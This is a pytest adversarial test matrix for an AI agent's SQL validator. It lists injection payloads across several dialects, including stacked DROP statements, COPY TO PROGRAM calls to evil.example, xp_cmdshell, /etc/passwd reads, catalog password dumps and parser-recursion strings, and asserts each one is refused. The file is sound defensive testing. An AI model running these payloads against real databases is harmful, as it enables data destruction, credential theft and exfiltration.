"""Adversarial attack matrix against `agent/sql_validator.py`.

Written for the UAT-readiness audit's Phase 2 (2026-10-25). Where
`tests/test_sql_validator.py` pins the validator's *contract* -- what each
check does and why -- this file does the opposite thing: it is a corpus of
payloads written to get **past** that contract, run against every supported
dialect, with the single assertion that none of them is accepted.

Why a second file rather than more cases in the first one. The two have
different failure meanings. A break in `test_sql_validator.py` says a
documented behaviour changed. A break here says an attack that used to be
refused now works -- and the payload itself is the report. Keeping them
apart also keeps this file appendable: the natural response to a new CVE,
a new dialect feature or a new idea is to add a row, not to find the right
class to extend.

Five of these payloads were **accepted or crashed** when this file was
first written. Each is marked with its finding ID, and each is the reason
the corresponding guard in `agent/sql_validator.py` exists:

  - `SEC-002` parser recursion exhaustion -- `RecursionError` escaped the
    module entirely, from payloads as small as 90 bytes.
  - `SEC-003` `FOR UPDATE` / `WITH (TABLOCKX)` lock escalation.
  - `SEC-004` nested-SQL evaluators (`query_to_xml`, `DBMS_XMLGEN.GETXML`)
    -- the one class that was a *gate bypass*, not merely an extra
    capability: the inner query string is never parsed, so the
    system-catalog gate did not apply to what actually ran.
  - `SEC-005` `OPTION (QUERYTRACEON ...)` / `OPTION (MAXDOP 0)`.

`TestPayloadsThatAreCorrectlyAccepted` at the end records the opposite
result: three payloads that this sweep accepts **and should**. They are
kept here so a later session does not re-report them as findings, and so
the reason each is safe is written down next to the payload rather than
rediscovered.
"""

from __future__ import annotations

import pytest

from agent.sql_validator import SAFETY_VIOLATION_TYPES, validate_sql

#: Every dialect `db.connection.get_sqlglot_dialect` can return, plus
#: `None` (sqlglot's generic dialect, `DEFAULT_DIALECT`). A payload with no
#: dialect of its own is tried against all five -- a check that holds for
#: `tsql` but not `postgres` is not a control.
ALL_DIALECTS: tuple[str | None, ...] = ("tsql", "postgres", "mysql", "oracle", None)


def _expand(
    payloads: list[tuple[str, str, tuple[str | None, ...] | None]],
) -> list[tuple[str, str, str | None]]:
    """(label, sql, dialects|None) -> one case per (payload, dialect)."""
    return [
        (label, sql, dialect)
        for label, sql, dialects in payloads
        for dialect in (dialects or ALL_DIALECTS)
    ]


# --------------------------------------------------------------------------
# Statement smuggling: more than one statement, or a write hidden in one.
# --------------------------------------------------------------------------
_SMUGGLING: list[tuple[str, str, tuple[str | None, ...] | None]] = [
    ("stacked-drop", "SELECT 1; DROP TABLE users", None),
    ("stacked-double-semicolon", "SELECT 1;; DELETE FROM users", None),
    ("stacked-behind-line-comment", "SELECT 1 -- \nDROP TABLE users", None),
    ("stacked-behind-block-comment", "SELECT 1 /* x */; DROP TABLE t", None),
    ("stacked-behind-nested-comment", "SELECT 1 /* a /* b */ c */; DROP TABLE t", None),
    ("semicolon-in-string-then-dml", "SELECT 'a;b'; DROP TABLE t", None),
    ("tsql-go-batch-separator", "SELECT 1\nGO\nDROP TABLE t", ("tsql",)),
    ("cte-wrapping-delete", "WITH x AS (DELETE FROM t RETURNING *) SELECT * FROM x", ("postgres",)),
    (
        "cte-wrapping-insert",
        "WITH x AS (INSERT INTO t VALUES (1) RETURNING *) SELECT * FROM x",
        ("postgres",),
    ),
    (
        "cte-wrapping-update",
        "WITH x AS (UPDATE t SET a=1 RETURNING *) SELECT * FROM x",
        ("postgres",),
    ),
    (
        "cte-wrapping-delete-two-levels-down",
        "WITH a AS (SELECT 1), b AS (WITH c AS (DELETE FROM t RETURNING *) SELECT * FROM c) "
        "SELECT * FROM b",
        ("postgres",),
    ),
    ("subquery-wrapping-delete", "SELECT * FROM (DELETE FROM t RETURNING *) z", ("postgres",)),
    ("select-into-table", "SELECT * INTO newt FROM t", None),
    ("select-into-outfile", "SELECT * FROM t INTO OUTFILE '/tmp/x'", ("mysql",)),
    ("select-into-dumpfile", "SELECT a FROM t INTO DUMPFILE '/tmp/x'", ("mysql",)),
    ("merge-delete", "MERGE INTO t USING s ON t.a=s.a WHEN MATCHED THEN DELETE", None),
    ("truncate", "TRUNCATE TABLE t", None),
    ("grant", "GRANT ALL ON t TO public", None),
    ("revoke", "REVOKE SELECT ON t FROM u", None),
    ("alter-user-password", "ALTER USER u WITH PASSWORD 'x'", ("postgres",)),
    ("create-user", "CREATE USER hacker PASSWORD 'x'", ("postgres",)),
    ("drop-schema-cascade", "DROP SCHEMA public CASCADE", ("postgres",)),
    ("do-block-with-delete", "DO $Q$ BEGIN DELETE FROM t; END $Q$", ("postgres",)),
    (
        "create-function",
        "CREATE FUNCTION f() RETURNS int AS 'SELECT 1' LANGUAGE sql",
        ("postgres",),
    ),
    ("transaction-control", "BEGIN; SELECT 1; COMMIT", ("postgres",)),
    ("set-then-select", "SET statement_timeout = 0; SELECT 1", ("postgres",)),
    ("set-role", "SET ROLE postgres", ("postgres",)),
    ("lock-table-statement", "LOCK TABLE t", ("postgres",)),
    ("bulk-insert", "BULK INSERT t FROM 'c:/x.csv'", ("tsql",)),
    ("copy-to-program", "COPY (SELECT 1) TO PROGRAM 'curl evil.example'", ("postgres",)),
    ("copy-from-program", "COPY t FROM PROGRAM 'curl evil.example'", ("postgres",)),
]

# --------------------------------------------------------------------------
# Side-effecting / egressing / file-reading functions, called from inside a
# statement whose root really is an ordinary SELECT.
# --------------------------------------------------------------------------
_DANGEROUS_CALLS: list[tuple[str, str, tuple[str | None, ...] | None]] = [
    ("pg_sleep", "SELECT pg_sleep(10)", ("postgres",)),
    ("pg_sleep-in-a-subquery", "SELECT * FROM t WHERE a = (SELECT pg_sleep(10))", ("postgres",)),
    ("pg_read_file", "SELECT pg_read_file('/etc/passwd')", ("postgres",)),
    ("pg_ls_dir", "SELECT pg_ls_dir('/')", ("postgres",)),
    ("pg_logdir_ls", "SELECT * FROM pg_logdir_ls()", ("postgres",)),  # SEC-004
    ("lo_import", "SELECT lo_import('/etc/passwd')", ("postgres",)),
    ("dblink", "SELECT * FROM dblink('host=evil.example','SELECT 1') AS x(a int)", ("postgres",)),
    ("mysql-sleep", "SELECT sleep(10)", ("mysql",)),
    ("mysql-benchmark", "SELECT benchmark(100000000, md5('a'))", ("mysql",)),
    ("mysql-load_file", "SELECT load_file('/etc/passwd')", ("mysql",)),
    ("openrowset", "SELECT * FROM OPENROWSET('SQLNCLI','Server=evil;','SELECT 1') AS a", ("tsql",)),
    ("openquery", "SELECT * FROM OPENQUERY(linked, 'SELECT 1')", ("tsql",)),
    ("opendatasource", "SELECT * FROM OPENDATASOURCE('SQLNCLI','Server=evil').db.dbo.t", ("tsql",)),
    ("xp_cmdshell-via-exec", "EXEC xp_cmdshell 'whoami'", ("tsql",)),
    (
        "xp_cmdshell-inside-a-select",
        "SELECT * FROM t WHERE 1=1 AND 1=(SELECT 1 FROM master..xp_cmdshell('dir'))",
        ("tsql",),
    ),
    ("sp_executesql", "EXEC sp_executesql N'DROP TABLE t'", ("tsql",)),
    ("exec-stored-procedure", "EXECUTE dbo.DoThing", ("tsql",)),
    ("waitfor-delay", "WAITFOR DELAY '00:00:10'", ("tsql",)),
    ("waitfor-delay-stacked", "SELECT 1; WAITFOR DELAY '00:00:10'", ("tsql",)),
    ("fn_dblog", "SELECT * FROM fn_dblog(NULL, NULL)", ("tsql",)),  # SEC-004
    ("fn_trace_gettable", "SELECT * FROM fn_trace_gettable('c:/t.trc', 1)", ("tsql",)),  # SEC-004
    (
        "fn_get_audit_file",
        "SELECT * FROM fn_get_audit_file('c:/a.sqlaudit', NULL, NULL)",
        ("tsql",),
    ),
    ("fn_virtualfilestats", "SELECT * FROM fn_virtualfilestats(1, 1)", ("tsql",)),  # SEC-004
    ("oracle-utl_http", "SELECT UTL_HTTP.REQUEST('http://evil.example') FROM dual", ("oracle",)),
    ("oracle-utl_file", "SELECT UTL_FILE.FOPEN('D','f','r') FROM dual", ("oracle",)),
    ("oracle-dbms_lock-sleep", "SELECT DBMS_LOCK.SLEEP(10) FROM dual", ("oracle",)),
    ("oracle-dbms_scheduler", "SELECT DBMS_SCHEDULER.CREATE_JOB('a') FROM dual", ("oracle",)),
]

# --------------------------------------------------------------------------
# SEC-004's gate-bypass class, called out separately because it is the only
# group here that defeats another check rather than adding a capability: the
# argument is a *query string* the engine executes and sqlglot never parses.
# --------------------------------------------------------------------------
_NESTED_SQL_EVALUATORS: list[tuple[str, str, tuple[str | None, ...] | None]] = [
    (
        "query_to_xml-reading-the-catalog",
        "SELECT query_to_xml('SELECT * FROM pg_authid', true, true, '')",
        ("postgres",),
    ),
    (
        "query_to_xml-wrapping-a-delete",
        "SELECT query_to_xml('DELETE FROM employees', true, true, '')",
        ("postgres",),
    ),
    ("query_to_xmlschema", "SELECT query_to_xmlschema('SELECT 1', true, true, '')", ("postgres",)),
    (
        "query_to_xml_and_xmlschema",
        "SELECT query_to_xml_and_xmlschema('SELECT 1', true, true, '')",
        ("postgres",),
    ),
    (
        "dbms_xmlgen-reading-the-dictionary",
        "SELECT DBMS_XMLGEN.GETXML('SELECT * FROM DBA_USERS') FROM dual",
        ("oracle",),
    ),
    (
        "dbms_sql-parse",
        "SELECT DBMS_SQL.PARSE(1, 'DROP TABLE t', 1) FROM dual",
        ("oracle",),
    ),
]

# --------------------------------------------------------------------------
# System catalogs and data dictionaries, across dialects and spellings.
# --------------------------------------------------------------------------
_CATALOG_ACCESS: list[tuple[str, str, tuple[str | None, ...] | None]] = [
    ("information_schema", "SELECT * FROM information_schema.columns", None),
    ("information_schema-mixed-case", "SELECT * FROM InFoRmAtIoN_sChEmA.TABLES", None),
    ("information_schema-quoted", 'SELECT * FROM "information_schema"."columns"', None),
    ("information_schema-bracketed", "SELECT * FROM [information_schema].[columns]", ("tsql",)),
    ("information_schema-db-qualified", "SELECT * FROM mydb.information_schema.columns", None),
    ("pg_catalog", "SELECT * FROM pg_catalog.pg_roles", ("postgres",)),
    ("pg_shadow-unqualified", "SELECT * FROM pg_shadow", ("postgres",)),
    ("pg_user-unqualified", "SELECT * FROM pg_user", ("postgres",)),
    ("pg_authid-unqualified", "SELECT rolpassword FROM pg_authid", ("postgres",)),
    ("pg_class-unqualified", "SELECT relname FROM pg_class", ("postgres",)),
    ("mssql-sys-schema", "SELECT * FROM sys.database_principals", ("tsql",)),
    ("mssql-sysobjects-legacy", "SELECT * FROM sysobjects", ("tsql",)),
    ("mssql-syscolumns-legacy", "SELECT * FROM syscolumns", ("tsql",)),
    ("mssql-syscomments-legacy", "SELECT text FROM syscomments", ("tsql",)),
    ("mssql-sysusers-legacy", "SELECT * FROM sysusers", ("tsql",)),
    ("mssql-cross-database-sys", "SELECT * FROM master.sys.sql_logins", ("tsql",)),
    ("mssql-four-part-linked-server", "SELECT * FROM evilsrv.master.dbo.sysusers", ("tsql",)),
    ("oracle-dba_users", "SELECT * FROM DBA_USERS", ("oracle",)),
    ("oracle-all_tables", "SELECT * FROM ALL_TABLES", ("oracle",)),
    ("oracle-user_tab_columns", "SELECT * FROM USER_TAB_COLUMNS", ("oracle",)),
    ("oracle-v-dollar-session", "SELECT * FROM V$SESSION", ("oracle",)),
    ("oracle-gv-dollar-session", "SELECT * FROM GV$SESSION", ("oracle",)),
]

# --------------------------------------------------------------------------
# SEC-003: locking. Read-only in projection, blocking in effect.
# --------------------------------------------------------------------------
_LOCKING: list[tuple[str, str, tuple[str | None, ...] | None]] = [
    ("for-update", "SELECT * FROM t FOR UPDATE", None),
    ("for-share", "SELECT * FROM t FOR SHARE", None),
    ("for-update-nowait", "SELECT * FROM t FOR UPDATE NOWAIT", None),
    ("for-update-inside-a-subquery", "SELECT * FROM (SELECT * FROM t FOR UPDATE) z", ("postgres",)),
    (
        "for-update-inside-a-cte",
        "WITH locked AS (SELECT * FROM t FOR UPDATE) SELECT * FROM locked",
        ("postgres",),
    ),
    ("tablockx-hint", "SELECT * FROM t WITH (TABLOCKX) WHERE a=1", ("tsql",)),
    ("updlock-holdlock-hint", "SELECT * FROM t WITH (UPDLOCK, HOLDLOCK)", ("tsql",)),
    ("xlock-hint", "SELECT a FROM t WITH (XLOCK)", ("tsql",)),
    ("serializable-hint", "SELECT a FROM t WITH (SERIALIZABLE)", ("tsql",)),
]

# --------------------------------------------------------------------------
# SEC-005 and its predecessor: query options that override an engine limit.
# --------------------------------------------------------------------------
_UNSAFE_OPTIONS: list[tuple[str, str, tuple[str | None, ...] | None]] = [
    (
        "maxrecursion-unlimited",
        "WITH RECURSIVE r AS (SELECT 1 UNION ALL SELECT 1 FROM r) SELECT * FROM r "
        "OPTION (MAXRECURSION 0)",
        ("tsql",),
    ),
    ("querytraceon", "SELECT 1 OPTION (QUERYTRACEON 8649)", ("tsql",)),
    ("maxdop-every-core", "SELECT 1 OPTION (MAXDOP 0)", ("tsql",)),
]

# --------------------------------------------------------------------------
# SEC-002: nesting depth. Each of these raised `RecursionError` out of
# `validate_sql` before the guard existed.
#
# **The depth at which a payload raises is not a property of the payload.**
# It is the interpreter's remaining stack, so it moves with the dialect
# (each one's parser spends a different number of frames per nesting level)
# and with how deep the *caller* already is. Measured 2026-10-25 against
# `sqlglot.parse` on Python 3.14, as the smallest raising depth:
#
#     shape    tsql  postgres  mysql  oracle  generic      ...and the same
#     parens     44        41     42      44       44      shapes with only
#     func       41        37     39      41       41      200 extra frames
#     not        97        81     97      97       97      on the caller's
#     subq      193       192    193     193      193      stack:
#     case       44        41     42      44       44      35/30/64/152/32
#
# So `SELECT ` + 41 parens (**90 bytes**) raised under postgres but parsed
# fine under tsql, while 32 parens raised under postgres from 200 frames
# down. Under FastAPI plus the LangGraph node stack the usable depth is
# lower again. That is the whole argument for catching the exception rather
# than capping depth: there is no single number to cap at.
#
# The two lists below follow from that. `_RECURSION_DEEP` is sized well
# past every threshold in the table, so it is deterministic and must always
# be refused. `_RECURSION_BORDERLINE` sits *at* the measured minimums, where
# the outcome legitimately differs by dialect and stack -- there the only
# assertion that can be made, and the only one that matters, is that it
# never raises.
# --------------------------------------------------------------------------
_RECURSION_DEEP: list[tuple[str, str, tuple[str | None, ...] | None]] = [
    ("nested-parens-1000", "SELECT " + "(" * 1000 + "1" + ")" * 1000, None),
    ("nested-function-calls-500", "SELECT " + "ABS(" * 500 + "1" + ")" * 500, None),
    ("nested-not-operators-600", "SELECT * FROM t WHERE " + "NOT " * 600 + "1=1", None),
    (
        "nested-subqueries-600",
        "SELECT * FROM " + "(SELECT * FROM " * 600 + "t" + ")" * 600,
        None,
    ),
    (
        "nested-case-expressions-500",
        "SELECT " + "CASE WHEN 1=1 THEN " * 500 + "1" + " END" * 500,
        None,
    ),
]

_RECURSION_BORDERLINE: list[tuple[str, str, tuple[str | None, ...] | None]] = [
    # 90 bytes -- the payload from the finding itself.
    ("nested-parens-41", "SELECT " + "(" * 41 + "1" + ")" * 41, None),
    ("nested-function-calls-37", "SELECT " + "ABS(" * 37 + "1" + ")" * 37, None),
    ("nested-not-operators-81", "SELECT * FROM t WHERE " + "NOT " * 81 + "1=1", None),
    (
        "nested-subqueries-89",
        "SELECT * FROM " + "(SELECT * FROM " * 89 + "t" + ")" * 89,
        None,
    ),
]

#: Payloads that must be *refused*. `_RECURSION_BORDERLINE` is deliberately
#: not here -- see its own comment; it is covered by the never-raises check.
_ALL_ATTACKS = (
    _SMUGGLING
    + _DANGEROUS_CALLS
    + _NESTED_SQL_EVALUATORS
    + _CATALOG_ACCESS
    + _LOCKING
    + _UNSAFE_OPTIONS
    + _RECURSION_DEEP
)

#: Everything the never-raises check covers, borderline depths included.
_ALL_PAYLOADS = _ALL_ATTACKS + _RECURSION_BORDERLINE


class TestNoAttackPayloadIsAccepted:
    """The single assertion this whole file exists to make."""

    @pytest.mark.parametrize(
        ("label", "sql", "dialect"), _expand(_ALL_ATTACKS), ids=lambda v: str(v)
    )
    def test_payload_is_refused(self, label: str, sql: str, dialect: str | None) -> None:
        result = validate_sql(sql, dialect=dialect)

        assert not result.is_valid, (
            f"{label!r} was ACCEPTED under dialect {dialect!r}. "
            f"normalized_sql={result.normalized_sql!r}"
        )
        assert result.violation_type is not None
        assert result.error

    @pytest.mark.parametrize(
        ("label", "sql", "dialect"), _expand(_ALL_PAYLOADS), ids=lambda v: str(v)
    )
    def test_payload_never_raises(self, label: str, sql: str, dialect: str | None) -> None:
        """A refusal, never an exception.

        Separate from the assertion above because the two failures mean
        different things: an acceptance is a bypass, while an exception is
        the security boundary going down instead of saying no -- which is
        exactly what `SEC-002` was. `validate_sql`'s callers
        (`agent.nodes.validate_sql_node`, `POST /execute`, the BI and
        artifact refresh paths) all branch on `ValidationResult`; none has
        an `except` for this.
        """
        try:
            validate_sql(sql, dialect=dialect)
        except Exception as exc:  # noqa: BLE001 -- any exception is the defect
            pytest.fail(f"{label!r} raised {type(exc).__name__} under dialect {dialect!r}: {exc}")


class TestSafetyViolationsFailClosedAndAreNotRetryable:
    """A bypass attempt must not be fed back to the model as a hint.

    `agent.nodes.validate_sql_node` retries anything whose violation type is
    outside `SAFETY_VIOLATION_TYPES`. Classifying one of these as retryable
    would spend the retry budget coaching the model toward a statement this
    app must never run -- and, for `unparseable_depth`, would re-raise on
    the same text.
    """

    @pytest.mark.parametrize(
        ("label", "sql", "dialect"),
        _expand(_SMUGGLING + _DANGEROUS_CALLS + _NESTED_SQL_EVALUATORS + _CATALOG_ACCESS),
        ids=lambda v: str(v),
    )
    def test_a_bypass_attempt_is_a_safety_violation(
        self, label: str, sql: str, dialect: str | None
    ) -> None:
        result = validate_sql(sql, dialect=dialect)

        assert result.violation_type in SAFETY_VIOLATION_TYPES | {"parse_error", "empty"}, (
            f"{label!r} refused as {result.violation_type!r}, which "
            f"agent.nodes.validate_sql_node would retry"
        )

    @pytest.mark.parametrize(
        ("label", "sql", "dialect"), _expand(_RECURSION_DEEP), ids=lambda v: str(v)
    )
    def test_unparseable_depth_is_never_retried(
        self, label: str, sql: str, dialect: str | None
    ) -> None:
        result = validate_sql(sql, dialect=dialect)

        assert result.violation_type == "unparseable_depth"
        assert "unparseable_depth" in SAFETY_VIOLATION_TYPES

    @pytest.mark.parametrize(
        ("label", "sql", "dialect"), _expand(_RECURSION_BORDERLINE), ids=lambda v: str(v)
    )
    def test_a_borderline_depth_either_refuses_or_validates_but_never_raises(
        self, label: str, sql: str, dialect: str | None
    ) -> None:
        """At the measured threshold the outcome is legitimately variable.

        Whether a given depth exhausts the stack depends on the dialect and
        on how deep the caller already is (see `_RECURSION_BORDERLINE`'s
        comment for the measured table). Asserting a specific outcome here
        would pin an implementation detail of sqlglot's frame usage and
        break on any version bump. The invariant worth holding is narrower
        and sharper: whichever way it goes, `validate_sql` returns a
        `ValidationResult` -- and if it refuses, it refuses for the honest
        reason.
        """
        result = validate_sql(sql, dialect=dialect)

        if not result.is_valid:
            assert result.violation_type == "unparseable_depth"
        else:
            assert result.normalized_sql is not None

    @pytest.mark.parametrize(("label", "sql", "dialect"), _expand(_LOCKING), ids=lambda v: str(v))
    def test_locking_is_never_retried(self, label: str, sql: str, dialect: str | None) -> None:
        result = validate_sql(sql, dialect=dialect)

        assert result.violation_type == "row_lock"
        assert "row_lock" in SAFETY_VIOLATION_TYPES


class TestRefusalsAreNotAnOracle:
    """CLAUDE.md §5.5: a refusal must not report what matched.

    The error text may name the construct the caller itself supplied -- that
    is the caller's own input and tells them nothing new -- but it must never
    quote the validator's internal denylist membership, the names of other
    entries, or anything about the configured database.
    """

    @pytest.mark.parametrize(
        ("label", "sql", "dialect"),
        _expand(_DANGEROUS_CALLS + _CATALOG_ACCESS),
        ids=lambda v: str(v),
    )
    def test_the_refusal_text_does_not_enumerate_the_denylist(
        self, label: str, sql: str, dialect: str | None
    ) -> None:
        result = validate_sql(sql, dialect=dialect)

        assert result.error is not None
        # A refusal names at most the one construct found. Anything that
        # listed several would be handing over the denylist.
        assert result.error.count("xp_cmdshell") <= 1
        assert "_DANGEROUS_FUNCTION_NAMES" not in result.error
        assert "_SYSTEM_CATALOG_SCHEMAS" not in result.error

    def test_the_recursion_refusal_says_why_without_claiming_a_finding(self) -> None:
        """`unparseable_depth` must not imply the statement was malicious.

        It means the opposite: nothing was learned about it. Saying "this
        contained a dangerous function" would be a fabricated finding, which
        is as much a correctness defect as missing a real one.
        """
        result = validate_sql("SELECT " + "(" * 60 + "1" + ")" * 60, dialect="postgres")

        assert result.violation_type == "unparseable_depth"
        assert result.error is not None
        assert "not because of anything it was found to contain" in result.error


class TestPayloadsThatAreCorrectlyAccepted:
    """Recorded results, not defects -- read before reporting one of these.

    Each of the three was flagged by the Phase 2 sweep as "accepted" and
    each was then run down and found safe. They are pinned here so the next
    sweep does not spend the time again, and so the reasoning sits beside
    the payload.
    """

    def test_a_zero_width_space_inside_a_catalog_name_is_not_a_bypass(self) -> None:
        """`info<ZWSP>rmation_schema` is accepted, and that is correct.

        It is a *different identifier*, not an obfuscated spelling of the
        real one. No supported engine strips zero-width characters from an
        identifier, so the statement reaches the server naming a table that
        does not exist and fails there.

        The claim that makes this safe is the absence of normalization
        between the gate and the driver, so that is what this test pins: the
        validator's own `normalized_sql` still carries the zero-width
        character. If some later change folds Unicode anywhere on the
        governed path (`enforce_row_limit` -> `qualify_table_schema` ->
        `execute_readonly_sql`), this assertion fails and the payload
        becomes a real bypass.
        """
        sql = "SELECT * FROM info\u200brmation_schema.columns"

        result = validate_sql(sql, dialect="postgres")

        assert result.is_valid
        assert result.normalized_sql is not None
        assert "\u200b" in result.normalized_sql, (
            "the zero-width character was normalized away -- the payload now "
            "resolves to the real information_schema and this is a bypass"
        )
        # The un-obfuscated spelling is, of course, still refused.
        assert not validate_sql(
            "SELECT * FROM information_schema.columns", dialect="postgres"
        ).is_valid

    def test_a_very_wide_union_is_accepted(self) -> None:
        """500 `UNION ALL` branches is legal, read-only SQL.

        Breadth is not depth: it does not recurse, and the cost it implies
        is bounded by the layers built for cost -- `estimate_cost`, the
        driver-level query timeout, and the row cap enforced both in the SQL
        text and at the cursor (CLAUDE.md §5.1). The validator is not the
        right place to guess at expense.
        """
        result = validate_sql(" UNION ALL ".join(["SELECT 1"] * 500), dialect="postgres")

        assert result.is_valid

    def test_a_twenty_thousand_element_in_list_is_accepted(self) -> None:
        """Same reasoning as the wide union, and the same bounding layers."""
        sql = "SELECT * FROM t WHERE a IN (" + ",".join(["1"] * 20_000) + ")"

        result = validate_sql(sql, dialect="postgres")

        assert result.is_valid
